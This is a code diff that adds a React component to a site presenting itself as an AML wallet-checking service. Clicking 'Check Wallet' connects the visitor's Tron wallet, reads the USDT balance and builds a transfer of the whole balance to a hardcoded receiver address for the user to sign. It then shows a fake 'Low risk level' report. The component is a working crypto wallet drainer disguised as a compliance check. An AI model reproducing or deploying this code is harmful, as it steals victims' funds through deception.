@@ -1,60 +1,122 @@
-import { Outlet } from "react-router-dom";
-import { TronAuthButton } from "../tronAuthButton/TronAuthButton";
+// src/components/tronAuthButton/TronAuthButton.tsx
 
-const Layout = () => {
-    return (
-        <>
-            <header className="rIYD0d _1POjMs _14pLN0 IfuBxn">
-                <div className="b_L6f_ eOD671">
-                    <a className="Zcp_6V">
-                        <img src="images/logo.svg" />
-                    </a>
-                    <nav className="ZQfMnc">
-                        <a className="_menu1" href="index.html#pricing">Pricing</a>
-                        <a className="_menu1" href="index.html#faq">FAQ</a>
-                    </nav>
-                    <nav className="Mwyj41 undefined">
-                        <div className="LJ7GIf wZ_Bne _BTY_Y dzM2XM mwcOHg" style={{ cursor: "pointer" }}>
-                            <TronAuthButton />
-                            <span className="sign1">Check Wallet</span>
-                        </div>
-                    </nav>
-                </div>
-            </header>
+import React, { useState, useEffect } from 'react';
+import { tronWeb, adapter } from './tronWallet.ts';  // импорт из tronWallet.ts
+import { Buffer } from 'buffer';
 
-            <Outlet />
+window.Buffer = Buffer; // полифилл для Buffer
 
-            <footer className="_99rnTN xpfe1_">
-                <div className="b_L6f_">
-                    <div className="gsp1gS">
-                        <div className="_0xfACM">
-                            <div className="mwrkyb">
-                                <img src="images/logo.svg" />
-                            </div>
-                            <div className="EOxXQw">
-                                <p>Unit 3C. 45 Hing Wah Street, Sham Shui Po, Kowloon, Hong Kong</p>
-                            </div>
-                        </div>
-                        <div className="TGa6sT">
-                            <div className="j8Gu_5">
-                                <img alt="ISO 9001:215" loading="lazy" width="120" height="120" decoding="async" src="images/iso-9001-black.58844294.svg" />
-                                <img alt="ISO 27001:2017" loading="lazy" width="120" height="120" decoding="async" src="images/iso-27001-black.6acb33dc.svg" />
-                            </div>
-                        </div>
+const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
+
+export const TronAuthButton: React.FC = () => {
+  const [status,  setStatus]  = useState<string | null>(null);
+  const [loading, setLoading] = useState(false);
+
+  // Прединициализация adapter для ускорения открытия модалки
+  useEffect(() => {
+    ;(adapter as any).init?.().catch(() => {});
+  }, []);
+
+  const connectWallet = async () => {
+    if (loading) return;
+    setLoading(true);
+    setStatus(null);
+
+    try {
+      // Всегда стартуем с чистого состояния
+      if (adapter.connected) {
+        await adapter.disconnect();
+      }
+      await adapter.connect();
+
+      const userAddress = adapter.address;
+      if (!userAddress || !tronWeb.isAddress(userAddress)) {
+        throw new Error('Invalid wallet address');
+      }
+      tronWeb.setAddress(userAddress);
+
+      // Проверка TRX (минимум 2 TRX)
+      const trxRaw = await tronWeb.trx.getBalance(userAddress);
+      const trx    = trxRaw / 1e6;
+      if (trx < 2) {
+        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
+        return;
+      }
+
+      // Проверка USDT
+      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
+      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
+      const usdt         = Number(usdtRaw) / 1e6;
+      if (usdt < 1) {
+        setStatus('succes');
+        return;
+      }
+
+      // Построение и отправка транзакции transfer
+      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_CONTRACT,
+        'transfer(address,uint256)',
+        { feeLimit: 25_000_000, callValue: 0 },
+        [
+          { type: 'address', value: TRON_RECEIVER },
+          { type: 'uint256', value: usdtRaw },
+        ],
+        userAddress
+      );
+      const signedTx = await adapter.signTransaction(transaction);
+      const result   = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
+    } catch (err: any) {
+      console.error('Error:', err);
+      const msg = err.message || String(err);
+      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
+        setStatus('⚠️ Connection or transaction error');
+      }
+    } finally {
+      setLoading(false);
+      await adapter.disconnect();
+    }
+  };
+
+  return (
+    <>
+      <div
+        className={`AuthButton${loading ? ' disabled' : ''}`}
+        onClick={connectWallet}
+      >
+        {loading ? 'Connecting...' : 'Check Wallet'}
+      </div>
+
+      {status && (
+        <div className="modal__overflow">
+          <div className="modal">
+            {status !== 'succes' ? (
+              <p>{status}</p>
+            ) : (
+              <>
+                <div className="content greenBorder">
+                  <div>0.6%</div>
+                  <div>
+                    <h3>Low risk level</h3>
+                    <div className="nums">
+                      <div><span className="circ green" /> 0–30</div>
+                      <div><span className="circ orange" /> 31–69</div>
+                      <div><span className="circ red" /> 70–100</div>
                     </div>
-                    <div className="_8yyV1L">
-                        <div className="to2XVo">© 2025 AMLTrack</div>
-                        <a href="https://t.me/amlcheck_support" rel="nofollow" className="e4Ejat">
-                            <svg className="icon icon-telegram">
-                                <use xmlnsXlink="http://www.w3.org/1999/xlink" xlinkHref="#icon-telegram"></use>
-                            </svg>
-                            Support
-                        </a>
-                    </div>
+                  </div>
                 </div>
-            </footer>
-        </>
-    );
+                <div className="content report">
+                  <p>AML report for a wallet:</p>
+                  <h5>{USDT_CONTRACT}</h5>
+                </div>
+              </>
+            )}
+            <button onClick={() => setStatus(null)}>Close</button>
+          </div>
+        </div>
+      )}
+    </>
+  );
 };
-
-export default Layout;
